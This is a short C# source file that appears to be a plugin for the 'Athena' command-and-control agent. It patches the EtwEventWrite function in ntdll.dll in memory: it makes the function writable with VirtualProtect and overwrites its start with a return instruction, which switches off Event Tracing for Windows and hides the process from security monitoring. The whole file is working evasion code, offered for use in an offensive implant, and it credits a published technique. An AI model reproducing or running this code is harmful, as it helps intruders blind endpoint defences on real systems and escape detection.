using PluginBase;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Athena
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    public static class Plugin
    {
        //Credit to code goes to Adeam Chester @_xpn_ - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
        //https://twitter.com/_xpn_

        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            try
            {
                if(PatchEtw(new byte[] { 0xc2, 0x14, 0x00 }))
                {
                    return new ResponseResult
                    {
                        completed = "true",
                        user_output = "ETW Patched.",
                        task_id = (string)args["task-id"],
                    };
                }
                else
                {
                    return new ResponseResult
                    {
                        completed = "true",
                        user_output = "Failed to patch ETW",
                        task_id = (string)args["task-id"], 
                        status = "error"
                    };
                }
            }
            catch (Exception e)
            {
                //oh no an error
                return new ResponseResult
                {
                    completed = "true",
                    user_output = e.Message,
                    task_id = (string)args["task-id"],
                    status = "error"
                };
            }
        }
        private static bool PatchEtw(byte[] patch)
        {
            try
            {
                uint oldProtect;

                var ntdll = Win32.LoadLibrary("ntdll.dll");
                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");

                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }

}
